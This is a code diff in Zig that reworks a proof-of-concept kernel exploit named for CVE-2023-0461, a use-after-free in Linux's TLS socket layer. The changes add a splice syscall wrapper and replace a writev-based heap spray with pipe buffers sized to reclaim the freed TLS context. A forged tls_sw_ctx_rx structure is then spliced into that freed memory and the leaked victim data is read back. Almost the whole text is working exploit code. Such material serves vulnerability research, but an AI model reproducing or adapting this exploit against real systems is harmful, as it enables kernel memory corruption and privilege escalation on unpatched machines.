@@ -100,6 +100,23 @@ pub fn writev(fd: os.fd_t, iov: []const iovec_const) os.WriteError!usize {
     }
 }
 
+pub fn splice(fd_in: l.fd_t, off_in: ?*l.off_t, fd_out: l.fd_t, off_out: ?*l.off_t, len: usize, flags: usize) !usize {
+    const rc = l.syscall6(
+        .splice,
+        @as(usize, @bitCast(@as(isize, fd_in))),
+        @intFromPtr(off_in),
+        @as(usize, @bitCast(@as(isize, fd_out))),
+        @intFromPtr(off_out),
+        len,
+        flags,
+    );
+
+    switch (errno(rc)) {
+        .SUCCESS => return @as(usize, @intCast(rc)),
+        else => |err| return os.unexpectedErrno(err),
+    }
+}
+
 fn retry_connect(sock: os.socket_t, sock_addr: *const os.sockaddr, len: os.socklen_t) !void {
     var n: u8 = 100;
     var last_err: os.ConnectError = undefined;
@@ -182,9 +199,13 @@ fn cve_2023_0461() !void {
     const unspec_addr = l.sockaddr{ .family = l.AF.UNSPEC, .data = undefined };
     const addr_sz = @sizeOf(@TypeOf(server_addr.sa));
 
-    const spray = try os.pipe();
-    _ = try os.fcntl(spray[0], F.SETPIPE_SZ, mem.page_size);
-    _ = try os.fcntl(spray[1], F.SETPIPE_SZ, mem.page_size);
+    const dst_pipe = try os.pipe();
+    _ = try os.fcntl(dst_pipe[0], F.SETPIPE_SZ, mem.page_size * 3);
+    _ = try os.fcntl(dst_pipe[1], F.SETPIPE_SZ, mem.page_size * 3);
+
+    const src_pipe = try os.pipe();
+    _ = try os.fcntl(src_pipe[0], F.SETPIPE_SZ, mem.page_size * 17);
+    _ = try os.fcntl(src_pipe[1], F.SETPIPE_SZ, mem.page_size * 17);
 
     const sync = try SyncPipe.init();
     defer sync.deinit();
@@ -196,29 +217,31 @@ fn cve_2023_0461() !void {
 
     if (child_pid == 0) {
         log.info("child: listen for first connection", .{});
-        {
-            const server_sk = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
-            defer os.closeSocket(server_sk);
+        const server_sk = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
+        defer os.closeSocket(server_sk);
 
-            try os.bind(server_sk, server_addr_p, addr_sz);
-            try os.listen(server_sk, 1);
-            try sync.cont(0);
+        try os.bind(server_sk, server_addr_p, addr_sz);
+        try os.listen(server_sk, 1);
+        try sync.cont(0);
 
-            const client_sk = try os.accept(server_sk, null, null, 0);
-            os.closeSocket(client_sk);
-        }
+        const client_sk0 = try os.accept(server_sk, null, null, 0);
+
+        log.info("child: warmup the crypto components", .{});
+        try os.setsockopt(client_sk0, SOL.TCP, l.TCP.ULP, "tls");
+        try setTLSOpt(client_sk0, .RX);
+        defer os.closeSocket(client_sk0);
 
         log.info("child: connect for second connection", .{});
-        const client_sk = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
-        defer os.closeSocket(client_sk);
+        const client_sk1 = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
+        defer os.closeSocket(client_sk1);
         try sync.wait(1);
-        try retry_connect(client_sk, target_addr_p, addr_sz);
+        try retry_connect(client_sk1, target_addr_p, addr_sz);
 
-        log.info("child: wait for parent to enter writev", .{});
+        log.info("child: wait for parent to enter splice", .{});
 
         {
             var buf: [2048]u8 = .{0x41} ** (mem.page_size / 2);
-            const len = try os.read(spray[0], &buf);
+            const len = try os.read(dst_pipe[0], &buf);
 
             log.info("child: read {}: {s}", .{
                 len,
@@ -231,8 +254,8 @@ fn cve_2023_0461() !void {
 
         log.info("child: read victim data", .{});
         {
-            var buf = [_]u8{0x42} ** (2048 + 4096 + 512);
-            const len = try os.read(spray[0], &buf);
+            var buf = [_]u8{0x42} ** (2048 + (4096 * 2) + 512);
+            const len = try os.read(dst_pipe[0], &buf);
 
             log.info("child: read {}: {s}", .{
                 len,
@@ -264,34 +287,45 @@ fn cve_2023_0461() !void {
     log.info("parent: free the context", .{});
     os.closeSocket(client_sk);
 
+    log.info("parent: fill the src pipe while we wait", .{});
+    const blocker: [4096 * 3]u8 = .{ 'b', 'l', 'o', 'k' } ** (1024 * 3);
+    const tls_sw_ctx_rx: [4096]u8 = .{0x00} ** 4096;
+    const to_write = blocker.len + tls_sw_ctx_rx.len;
+    const iov = [2]iovec_const{
+        .{
+            .iov_base = &blocker,
+            .iov_len = blocker.len,
+        },
+        .{
+            .iov_base = &tls_sw_ctx_rx,
+            .iov_len = tls_sw_ctx_rx.len,
+        },
+    };
+
+    {
+        const len = try writev(src_pipe[1], &iov);
+        if (len != to_write) {
+            log.err("parent: writev {} != {}", .{
+                len,
+                to_write,
+            });
+            return error.srcPipeNotFilled;
+        }
+    }
+
     log.info("parent: wait for deferred free", .{});
     os.nanosleep(6, 0);
 
-    // 17 * 16 = 272 > 256 so that we are in kmalloc-512
-    const blocker: [4096 * 2]u8 = .{ 'b', 'l', 'o', 'k' } ** (1024 * 2);
-    const overwritten: [512]u8 = .{ 'n', 'o', 'p', 'e' } ** 128;
-    const iov_zero = [1]iovec_const{.{ .iov_base = null, .iov_len = 0 }};
-    const iov_blocker = [1]iovec_const{.{
-        .iov_base = &blocker,
-        .iov_len = blocker.len,
-    }};
-    const iov_victim = [1]iovec_const{.{
-        .iov_base = 0,
-        .iov_len = overwritten.len,
-    }};
-    const iov: [17]iovec_const =
-        iov_blocker ++
-        (iov_zero ** 2) ++
-        iov_victim ++
-        (iov_zero ** 13);
-
     {
-        const len = try writev(spray[1], &iov);
-        if (len != overwritten.len + blocker.len)
-            log.err("parent: {} != {}", .{
+        const len = try splice(src_pipe[0], null, dst_pipe[1], null, to_write, 0);
+
+        if (len != to_write) {
+            log.err("parent: splice {} != {}", .{
                 len,
-                blocker.len + overwritten.len,
+                to_write,
             });
+            return error.srcPipeNotDrained;
+        }
     }
 
     try sync.wait(3);
